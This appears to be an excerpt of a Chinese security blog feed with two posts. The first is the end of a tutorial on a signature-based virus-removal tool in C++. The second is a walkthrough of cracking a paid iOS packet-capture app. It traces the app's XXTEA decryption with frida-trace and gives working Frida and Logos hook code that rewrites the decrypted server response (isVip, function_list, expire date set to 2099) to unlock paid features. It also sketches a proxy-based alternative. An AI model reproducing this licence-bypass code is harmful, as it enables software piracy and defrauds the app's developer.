alt="img"></p><blockquote><p>当然可能由于这里是虚拟机，所以部分杀软某些功能未启动而导致。</p></blockquote><p>有特征码了，就可以根据该特征码来判断文件是否是病毒文件，当然为了以防万一，可以采用进行多个特征码来进行判断。主要代码如下：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 扫描特征码，对比</span></span><br><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">GetPeSignature</span><span class="params">(LPCSTR FilePath)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    boolean flag = <span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">int</span> count = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">SIGN</span></span></span><br><span class="line"><span class="class">    &#123;</span></span><br><span class="line">        <span class="keyword">char</span> FileName[<span class="number">64</span>];         <span class="comment">// 存储文件名或特征描述</span></span><br><span class="line">        LONG FileOffset;           <span class="comment">// 存储检测文件偏移地址</span></span><br><span class="line">        BYTE VirusSign[<span class="number">4</span> + <span class="number">1</span>];    <span class="comment">// 存储特征码大小4,其中的1是结束符.</span></span><br><span class="line">    &#125;SIGN, *pSIGN;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 定义特征码与特征描述信息</span></span><br><span class="line">    SIGN Sign[] = &#123;</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="string">"HuoRong"</span>,</span><br><span class="line">            <span class="number">0x2970</span>,</span><br><span class="line">            <span class="string">"\x04\x6a\xf6\xeb"</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="string">"360_1"</span>,</span><br><span class="line">            <span class="number">0x61c6b</span>,</span><br><span class="line">            <span class="string">"\x8B\x75\xF0\x8B"</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="string">"360_2"</span>,</span><br><span class="line">            <span class="number">0x738E5</span>,</span><br><span class="line">            <span class="string">"\xC4\x07\x00\xBC"</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    DWORD dwNum = <span class="number">0</span>;</span><br><span class="line">    BYTE buffer[<span class="number">4</span> + <span class="number">1</span>];</span><br><span class="line">    HANDLE hFile = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 获取到FilePath路径下文件的句柄信息</span></span><br><span class="line">    hFile = CreateFile(FilePath, GENERIC_READ , <span class="literal">NULL</span>,</span><br><span class="line">        <span class="literal">NULL</span>, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, <span class="literal">NULL</span>);</span><br><span class="line">    <span class="comment">/*DWORD error = GetLastError();</span></span><br><span class="line"><span class="comment">    cout &lt;&lt; hFile &lt;&lt; error &lt;&lt; endl;*/</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> x = <span class="number">0</span>; x &lt; (<span class="keyword">sizeof</span>(Sign) / <span class="keyword">sizeof</span>(Sign[<span class="number">0</span>])); x++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">// 将待检测程序的文件指针指向特征码的偏移位置</span></span><br><span class="line">        SetFilePointer(hFile, Sign[x].FileOffset, <span class="literal">NULL</span>, FILE_BEGIN);</span><br><span class="line">        <span class="comment">// 读取目标程序指定位置的特征码到内存中</span></span><br><span class="line">        ReadFile(hFile, buffer, <span class="keyword">sizeof</span>(buffer), &amp;dwNum, <span class="literal">NULL</span>);</span><br><span class="line">        <span class="comment">// 对比内存中两个特征码是否相等</span></span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">memcmp</span>(Sign[x].VirusSign, buffer, <span class="number">4</span>) == <span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            count++;</span><br><span class="line">            <span class="comment">//printf("匹配特征: %s \n", Sign[x].FileName);</span></span><br><span class="line">        &#125;   </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (count == <span class="keyword">sizeof</span>(Sign) / <span class="keyword">sizeof</span>(Sign[<span class="number">0</span>])) &#123;</span><br><span class="line">        flag = <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    CloseHandle(hFile);</span><br><span class="line">    <span class="keyword">return</span> flag;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="3-删除病毒，恢复原文件"><a href="#3-删除病毒，恢复原文件" class="headerlink" title="3.删除病毒，恢复原文件"></a>3.删除病毒，恢复原文件</h3><p>接下来就是删除病毒和恢复文件了，可以直接使用<code>remove()</code>来删除文件，但是为了防止删错文件，因此这里将文件删除到了回收站。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">BOOL <span class="title">delFiletoRecycle</span><span class="params">(LPCTSTR pszPath, BOOL bDelete<span class="comment">/*=FALSE*/</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    SHFILEOPSTRUCT  shDelFile;</span><br><span class="line">    <span class="built_in">memset</span>(&amp;shDelFile, <span class="number">0</span>, <span class="keyword">sizeof</span>(SHFILEOPSTRUCT));</span><br><span class="line">    shDelFile.fFlags |= FOF_SILENT;      <span class="comment">// don't report progress</span></span><br><span class="line">    shDelFile.fFlags |= FOF_NOERRORUI;     <span class="comment">// don't report errors</span></span><br><span class="line">    shDelFile.fFlags |= FOF_NOCONFIRMATION;    <span class="comment">// don't confirm delete</span></span><br><span class="line"></span><br><span class="line">    TCHAR buf[_MAX_PATH + <span class="number">1</span>]; <span class="comment">// allow one more character</span></span><br><span class="line">    strcpy_s(buf, pszPath);   <span class="comment">// copy caller's pathname</span></span><br><span class="line">    buf[<span class="built_in">strlen</span>(buf) + <span class="number">1</span>] = <span class="number">0</span>;   <span class="comment">// need two NULLs at end</span></span><br><span class="line"></span><br><span class="line">                                 <span class="comment">// Set SHFILEOPSTRUCT params for delete operation</span></span><br><span class="line">    shDelFile.wFunc = FO_DELETE;       <span class="comment">// REQUIRED: delete operation</span></span><br><span class="line">    shDelFile.pFrom = buf;         <span class="comment">// REQUIRED: which file(s)</span></span><br><span class="line">    shDelFile.pTo = <span class="literal">NULL</span>;          <span class="comment">// MUST be NULL</span></span><br><span class="line">    <span class="keyword">if</span> (bDelete)</span><br><span class="line">    &#123;         <span class="comment">// if delete requested..</span></span><br><span class="line">        shDelFile.fFlags &amp;= ~FOF_ALLOWUNDO;    <span class="comment">// ..don't use Recycle Bin</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;           <span class="comment">// otherwise..</span></span><br><span class="line">        shDelFile.fFlags |= FOF_ALLOWUNDO;    <span class="comment">// ..send to Recycle Bin</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> SHFileOperation(&amp;shDelFile);    <span class="comment">// do it!</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>删除完毕后，如果存在原文件，就将原文件恢复。</p><p><img src="1666858868262.png" alt="img"></p><p>命令行的话可以使用<code>attirb</code>，这里代码的话采用了<code>SetFileAttributes</code>。并使用<code>rename</code>将原文件恢复原名。主要代码：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">SetFileAttributes(<span class="string">"gtest.exe"</span>, FILE_ATTRIBUTE_NORMAL);</span><br><span class="line">rename(<span class="string">"gtest.exe"</span>, <span class="string">"test.exe"</span>);</span><br></pre></td></tr></table></figure><p>然后将上面的代码整合一下运行，添加日志记录。运行效果：</p><p><img src="1666860279613.png" alt="img"></p><blockquote><p>这里执行的是感染后的”专杀”工具，可以看到又起了一个窗口，并执行了专杀工具。最终也会将该文件恢复。图上显示的仍为g开头，需要刷新一下即可。</p></blockquote><p>可以成功删除病毒文件并恢复原文件。</p><p><img src="1666860357983.png" alt="img"></p><p>删除的文件放在了回收站中。但从执行情况来看，有删除失败的文件，这是由于病毒文件正在执行，所以未能删除。要删除也可以，找到对应的pid，结束任务，再进行删除。这里就不再进行操作了。</p><h2 id="0x03-总结"><a href="#0x03-总结" class="headerlink" title="0x03 总结"></a>0x03 总结</h2><p>本文简单实现了一个病毒专杀工具，用的比较简单和基础的方法，没有涉及太多复杂的内容。可能存在问题较多，还有许多需要完善的地方，不过针对当前这款病毒查杀暂时没多大问题。最重要的一点就是如何去确定病毒的特征码，这将作为能否删除病毒文件的关键。</p>]]></content>
      
      
      <categories>
          
          <category> 病毒查杀 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 病毒查杀 </tag>
            
            <tag> 特征码 </tag>
            
            <tag> 代码开发 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>IOS逆向之某抓包APP</title>
      <link href="/2022/10/21/IOS-Storm-Sniffer-Reverse/"/>
      <url>/2022/10/21/IOS-Storm-Sniffer-Reverse/</url>
      
        <content type="html"><![CDATA[<h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>本文的测试目标是一个抓包的APP，可以使用hook或者代理的方式来获取高级功能，如解密HTTPS流量、重写HTTP请求以及重放等功能。由于个人账户（没有付费成为苹果开发者账号）的限制，注入打包后，无法正常使用抓包功能，因此算是一篇半成品，不过本文主要提供一些思路以及介绍一下数据之间的转换。</p><a id="more"></a><h2 id="0x01-分析"><a href="#0x01-分析" class="headerlink" title="0x01 分析"></a>0x01 分析</h2><p>运行后发现高级功能都需要付费才可以，抓包发现请求和返回都加密了。</p><p><img src="1665733985358.png" alt="img"></p><p>使用<code>frida-ios-dump</code>将ipa文件dump出来，之后用ida打开，发现该程序是用到了OC和swift。而且http请求采用了<code>Alamofire</code>，它是一个用 Swift 编写的 HTTP 网络库。</p><p>该程序较小，猜测加密函数中有<code>encrypt</code>关键字，于是在函数中搜索<code>encrypt</code>。</p><p>当然也可以根据http请求的一些内容搜索进而去定位加密的算法，在这里就不演示了。 </p><p><img src="1665734067271.png" alt="img"></p><p>可以看到有一些，可以使用<code>frida-trace</code>来追踪一下是调用了哪个方法。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">frida-trace -U -f com.xxxx -m <span class="string">"*[* *encrypt*]"</span></span><br></pre></td></tr></table></figure><p>使用该命令可以看到如下调用：</p><p><img src="1666079236052.png" alt="img"></p><p>经过进一步验证发现是调用了类<code>XMXXTEA</code>相关的加密函数。一般这样同个类存在多个加（解）密，大多数都是简单的调用复杂的。从上图就可以看出来<code>encryptStringToBase64String:arg1 stringKey:arg2</code>调用了<code>encryptToBase64String:arg1 stringKey:arg2</code>。</p><p>所以我们看 <code>+[XMXXTEA encryptStringToBase64String:arg1 stringKey:arg2]</code>即可。</p><p>命令如下：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">frida-trace -U -f com.xxxx -m <span class="string">"+[XMXXTEA encryptStringToBase64String:stringKey:]"</span></span><br></pre></td></tr></table></figure><p>执行后可以发现与抓包的内容一致。</p><p><img src="1666080138242.png" alt="img"></p><p>接下来我们看一下是否有数据的解密，同样搜<code>decrypt</code></p><p><img src="1666080460021.png" alt="img"></p><p> 根据上面的经验，猜测解密的是<code>+[XMXXTEA decryptBase64StringToString:stringKey:]</code>。结果进行追踪后发现并没调用，这里解密采用的是<code>+[XMXXTEA decryptBase64String:stringKey:]</code>。</p><p>可以看到解密数据。</p><p><img src="1666081155760.png" alt="img"></p><p>不过解密结果不是字符串类型，我们用<code>CyberChef</code>的hex解码后是json数据。</p><p><img src="1666081298004.png" alt="img"></p><p>返回的json中有几个关键的键值可以猜出其含义。例如<code>isVip</code>应该是判断是否为会员，<code>expire_on</code>表示到期时间，<code>auth_quantity</code>是授权数量，<code>function_list</code>应该是拥有的功能，比如非会员用户只有一个抓包功能，如果要拥有解密HTTPS、重写等功能，则<code>function_list</code>应该是[1,2,3]。当然这些只是猜测。</p><p>尝试修改一下<code>isVip</code>的值为1，看是否有反应。首先看一下<code>+[XMXXTEA decryptBase64String:stringKey:]</code>解密返回值的类型是什么。</p><p>主要代码：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">onLeave(log, retval, state) &#123;</span><br><span class="line">    <span class="keyword">var</span> ret = ObjC.Object(retval);</span><br><span class="line">    log(<span class="string">`ret type is --&gt;`</span>+ret.$className);</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>执行后返回的结果：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ret type is --&gt;NSConcreteData</span><br></pre></td></tr></table></figure><p>返回值是<code>NSConcreteData</code>类型的，可以看作为是<code>NSData</code>。修改返回值有两种方法，第一种是将<code>NSData</code>转化为<code>NSString</code>，然后利用字符串替换来修改，修改完毕后转化<code>NSData</code>并替换；第二种是将<code>NSData</code>转化为可变数组<code>NSMutableDictionary</code>，然后修改键的值，最后再转化<code>NSData</code>并替换。</p><p>下面分别看一下两种方法的OC代码，以及翻译成frida的js实现的代码。</p><h3 id="方法一：使用NSString替换"><a href="#方法一：使用NSString替换" class="headerlink" title="方法一：使用NSString替换"></a>方法一：使用NSString替换</h3><p>对应的主要OC代码如下：</p><figure class="highlight objectivec"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">NSString</span> *str = <span class="string">@"&#123;\"uid\": \"xxxxxxx\", \"userID\": \"xxxxx\", \"isVip\": 0, \"member_type\": 0, \"member_title\": \"\\u57fa\\u7840\\u7248\", \"expire_on\": \"\\u6682\\u672a\\u5f00\\u901aVIP\", \"auth_quantity\": 0, \"auth_mail\": null, \"is_primary\": 0, \"trail_status\": 0, \"function_list\": [1], \"timestamp\": 1666080682, \"ts\": 0&#125;"</span>;</span><br><span class="line"><span class="built_in">NSData</span> * data = [str dataUsingEncoding:<span class="built_in">NSUTF8StringEncoding</span>];<span class="comment">//NSString转换为NSData</span></span><br><span class="line"><span class="built_in">NSString</span> *oldString = [[<span class="built_in">NSString</span> alloc]initWithData:data encoding:<span class="built_in">NSUTF8StringEncoding</span>];<span class="comment">//NSData转换为NSString</span></span><br><span class="line"><span class="built_in">NSString</span> * newString = [str stringByReplacingOccurrencesOfString:<span class="string">@"\"isVip\": 0"</span> withString:<span class="string">@"\"isVip\": 1"</span>];<span class="comment">//替换字符串</span></span><br><span class="line"><span class="built_in">NSLog</span>(<span class="string">@"oldString is:\n%@"</span>,oldString);</span><br><span class="line"><span class="built_in">NSLog</span>(<span class="string">@"newString is:\n%@"</span>,newString);</span><br></pre></td></tr></table></figure><p>这里为了使用NSData数据，采用的是NSString转换而来的，当然也可以采用byte来生成。主要代码：</p><figure class="highlight objectivec"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Byte byte[] = &#123;<span class="number">0x7B</span>,..., <span class="number">0x7D</span>&#125;;</span><br><span class="line"><span class="built_in">NSData</span> *byteData = [[<span class="built_in">NSData</span> alloc] initWithBytes:byte length:<span class="keyword">sizeof</span>(byte)/<span class="keyword">sizeof</span>(Byte)];</span><br></pre></td></tr></table></figure><p>OC代码执行的结果如下：</p><p><img src="1666143640301.png" alt="img"></p><p>可以成功替换，翻译成frida的js实现如下：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">onLeave(log, retval, state) &#123;</span><br><span class="line">  <span class="keyword">var</span> ret = ObjC.Object(retval);</span><br><span class="line">  <span class="keyword">var</span> oldNSStr = ObjC.classes.NSString.alloc().initWithData_encoding_(ret, <span class="number">4</span>);<span class="comment">//NSData转换为NSString</span></span><br><span class="line">  log(<span class="string">`oldNSStr--&gt;`</span>+ oldNSStr);</span><br><span class="line">  <span class="keyword">var</span> newNSStr = oldNSStr.stringByReplacingOccurrencesOfString_withString_(<span class="string">'"isVip": 0'</span>,<span class="string">'"isVip": 1'</span>);<span class="comment">//替换字符串</span></span><br><span class="line">  log(<span class="string">`newNSStr--&gt;`</span>+ newNSStr);</span><br><span class="line">  retval.replace(newNSStr.dataUsingEncoding_(<span class="number">4</span>));<span class="comment">//NSString转换为NSData，并替换返回值</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>执行结果：</p><p><img src="1666100239409.png" alt="img"></p><p>同时查看我的账号界面可以看到PRO标志。</p><p><img src="1666101158786.png" alt="img"></p><p>但是点击解密HTTPS流量、重写等功能还是跳转到会员开通界面，这是因为这些功能是从<code>function_list</code>中获取的，所以想要解锁功能还需修改这里。主要代码：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> newNSStr = oldNSStr.stringByReplacingOccurrencesOfString_withString_(<span class="string">'"isVip": 0'</span>,<span class="string">'"isVip": 1'</span>).stringByReplacingOccurrencesOfString_withString_(<span class="string">'"is_vip": 0'</span>,<span class="string">'"is_vip": 1'</span>).stringByReplacingOccurrencesOfString_withString_(<span class="string">'"member_type": 0'</span>,<span class="string">'"member_type": 1'</span>).stringByReplacingOccurrencesOfString_withString_(<span class="string">'"auth_quantity": 0'</span>,<span class="string">'"auth_quantity": 3'</span>).stringByReplacingOccurrencesOfString_withString_(<span class="string">'"function_list": [1]'</span>,<span class="string">'"function_list": [1,2,3,4,5]'</span>).stringByReplacingOccurrencesOfString_withString_(<span class="string">'\\u6682\\u672a\\u5f00\\u901aVIP'</span>,<span class="string">'2099-09-09 14:22'</span>);</span><br><span class="line">log(<span class="string">`newNSStr--&gt;`</span>+ newNSStr);</span><br></pre></td></tr></table></figure><p>再次执行</p><p><img src="1666100947797.png" alt="img"></p><p>看到用户界面也成功变化了</p><p><img src="1666101229379.png" alt="img"></p><p>高级功能也可以使用</p><p><img src="1666101255791.png" alt="img"></p><p>例如重写功能，将请求的某度转到qq上</p><p><img src="1666101314198.png" alt="img"></p><p>功能都是可以正常使用的。</p><h3 id="方法二：使用NSMutableDictionary修改"><a href="#方法二：使用NSMutableDictionary修改" class="headerlink" title="方法二：使用NSMutableDictionary修改"></a>方法二：使用NSMutableDictionary修改</h3><p>对应的主要OC代码如下：</p><figure class="highlight objectivec"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">NSData</span> * data = [str dataUsingEncoding:<span class="built_in">NSUTF8StringEncoding</span>];</span><br><span class="line"><span class="built_in">NSMutableDictionary</span> * result = [<span class="built_in">NSJSONSerialization</span> JSONObjectWithData:data options:<span class="built_in">NSJSONReadingMutableContainers</span> error:<span class="literal">nil</span>];<span class="comment">//NSData转NSMutableDictionary</span></span><br><span class="line">[result setValue:[<span class="built_in">NSNumber</span> numberWithInt:<span class="number">1</span>] forKey:<span class="string">@"isVip"</span>];<span class="comment">//设置isVip为1</span></span><br><span class="line">[result setValue:<span class="string">@"[1,2,3,4,5]"</span> forKey:<span class="string">@"function_list"</span>];<span class="comment">//设置function_list</span></span><br><span class="line">[result setValue:<span class="string">@"2099-09-09 14:22"</span> forKey:<span class="string">@"expire_on"</span>];<span class="comment">//设置expire_on</span></span><br><span class="line"><span class="built_in">NSLog</span>(<span class="string">@"oldString is:%@"</span>,str);</span><br><span class="line"><span class="built_in">NSLog</span>(<span class="string">@"After Change is:%@"</span>,result);</span><br></pre></td></tr></table></figure><p>查看执行的结果</p><p><img src="1666141054823.png" alt="img"></p><p>这里翻译成frida的js实现时，有一个问题，生成<code>NSMutableDictionary</code>时，由于需要传入<code>nil</code>，而frida中无法生成，导致这种方法不能使用。根据别人提出的方法<code>var nil=ObjC.Object(ptr(&quot;0x0&quot;));</code>，测试代码如下：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> data = ObjC.classes.NSString.stringWithString_(<span class="string">'&#123;"aa":11,"bb":2&#125;'</span>) ;</span><br><span class="line"><span class="keyword">var</span> NSJSONSerialization = ObjC.classes.NSJSONSerialization;</span><br><span class="line"><span class="keyword">var</span> nil=ObjC.Object(ptr(<span class="string">"0x0"</span>));</span><br><span class="line">NSJSONSerialization.JSONObjectWithData_options_error_(data,<span class="number">1</span>,nil);</span><br></pre></td></tr></table></figure><p>运行后直接崩溃，导致无法使用，因此在frida下，暂时放弃第二种方法。</p><p>分析的话到这里就结束了，但借助frida来获取高级版，不方便使用，而且无法在非越狱手机上使用，如果想在非越狱手机上使用的话，就需要使用一些插件来运行在非越狱手机上。</p><h2 id="0x02-编写非越狱插件"><a href="#0x02-编写非越狱插件" class="headerlink" title="0x02 编写非越狱插件"></a>0x02 编写非越狱插件</h2><p>编写插件采用了非越狱插件开发集成神器<a href="https://github.com/AloneMonkey/MonkeyDev" target="_blank" rel="noopener">MonkeyDev</a>，集成了theos+Tweaks+Reveal.framework +Cycript +class-dump+CaptainHook。</p><p>安装和卸载可以参考<a href="https://github.com/AloneMonkey/MonkeyDev/wiki/安装" target="_blank" rel="noopener">https://github.com/AloneMonkey/MonkeyDev/wiki/%E5%AE%89%E8%A3%85</a></p><p>安装完成后新建MonkeyApp，<code>File-&gt;New-&gt;Project-&gt;MonkeyApp</code>。</p><p>项目建立后将砸壳后的APP拖入到<code>TargetApp</code>目录下。</p><p>这里使用Logos进行Hook代码，HOOK 某个类里面的某个对象方法语法：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">%hook 类名</span><br><span class="line">- (返回值)方法名:(id)arg1 ....</span><br><span class="line">&#123;</span><br><span class="line">...</span><br><span class="line">&#125;</span><br><span class="line">%end</span><br></pre></td></tr></table></figure><p>根据上面的分析，这里我们需要对<code>XMXXTEA</code> 类的方法<code>decryptBase64String:stringKey:</code>进行HOOK，修改返回值，主要代码如下：</p><figure class="highlight objectivec"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">%hook XMXXTEA</span><br><span class="line">+ (<span class="keyword">id</span>) decryptBase64String:(<span class="built_in">NSString</span>*) stringData stringKey:(<span class="built_in">NSString</span>*) key&#123;</span><br><span class="line"> <span class="built_in">NSLog</span>(<span class="string">@"Before : %@"</span>, %orig);</span><br><span class="line"><span class="built_in">NSData</span> *data = %orig;<span class="comment">//NSData</span></span><br><span class="line">    <span class="built_in">NSMutableDictionary</span> *result = [<span class="built_in">NSJSONSerialization</span> JSONObjectWithData:data options:<span class="built_in">NSJSONReadingMutableContainers</span> error:<span class="literal">nil</span>];<span class="comment">//NSData转换NSMutableDictionary</span></span><br><span class="line">    </span><br><span class="line">    [result setValue:[<span class="built_in">NSNumber</span> numberWithInt:<span class="number">1</span>] forKey:<span class="string">@"isVip"</span>];</span><br><span class="line">    [result setValue:[<span class="built_in">NSNumber</span> numberWithInt:<span class="number">1</span>] forKey:<span class="string">@"member_type"</span>];</span><br><span class="line">    [result setValue:[<span class="built_in">NSNumber</span> numberWithInt:<span class="number">3</span>] forKey:<span class="string">@"auth_quantity"</span>];</span><br><span class="line">    [result setValue:<span class="string">@"[1,2,3,4,5]"</span> forKey:<span class="string">@"function_list"</span>];</span><br><span class="line">    [result setValue:<span class="string">@"2099-09-03 14:22"</span> forKey:<span class="string">@"expire_on"</span>];</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">NSData</span> *data_result= [<span class="built_in">NSJSONSerialization</span> dataWithJSONObject:result options:<span class="built_in">NSJSONWritingPrettyPrinted</span> error:<span class="literal">nil</span>];</span><br><span class="line">    <span class="built_in">NSLog</span>(<span class="string">@"After : %@"</span>, data_result);</span><br><span class="line">    <span class="keyword">return</span> data_result;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">%end</span><br></pre></td></tr></table></figure><p>其实和上面第二种方法中的OC代码一样，连接非越狱手机后使用⌘+R运行该项目。</p><p>首次在新设备上运行，需要设置-通用-描述文件与设备管理中信任证书，ios16以上需要开启开发者模式，隐私安全-开发者模式，而且需要重启。</p><p>运行后，高级版功能都可以打开，但是无法开启抓包功能。</p><p>因为开启抓包需要开通网络访问权限以及VPN的相关权限，由于账号没有付费成为苹果开发者账号，因此这些权限无法使用。</p><p>苹果开发者账号可用的权限：</p><p><img src="1666147369001.png" alt="img"></p><p>非开发者账号可用的权限：</p><p><img src="1666147437744.png" alt="img"></p><p>这里即使把权限添加上，也会编译不通过的。</p><p><img src="1666147780150.png" alt="img"></p><p>这里就需要注册成开发者账号才可以继续进行，因此就放弃了。</p><h2 id="0x03-总结"><a href="#0x03-总结" class="headerlink" title="0x03 总结"></a>0x03 总结</h2><p>本文通过一款抓包APP借助于frida来获取高级权限，另外介绍了一下OC下NSData、NSString、NSMutableDictionary之间的数据转换，以及翻译成frida中js代码的实现。</p><p>其实也可以利用代理的方式，来修改返回包的内容，从而解锁会员功能。这里简单提供一下思路，可以借助第三方抓包软件（有重写功能的，手机上的也可以，如<code>HTTP Catcher</code>）。需要注意几点：一是每个设备加密key不一样，二是需要注意请求头中的t（时间戳），这个值与手机时间相差不能太多（可以修改手机时间）。大致流程就是首先获取加密算法的key，将请求头中的t、解密结果中的timestamp以及手机时间不要差太多，将修改后的数据加密后进行替换即可。或者自己搭建一个服务，将数据转发到自己服务上，解密修改后重新加密返回即可。</p>]]></content>
      
      
      <categories>
          
          <category> IOS逆向 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> frida </tag>
            
            <tag> Sniffer </tag>
            
            <tag> 抓包软件 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>IOS逆向之appsflyer平台解密</title>
      <link href="/2022/10/13/IOS-appsflyer-decrypt/"/>
      <url>/2022/10/13/IOS-appsflyer-decrypt/</url>
      
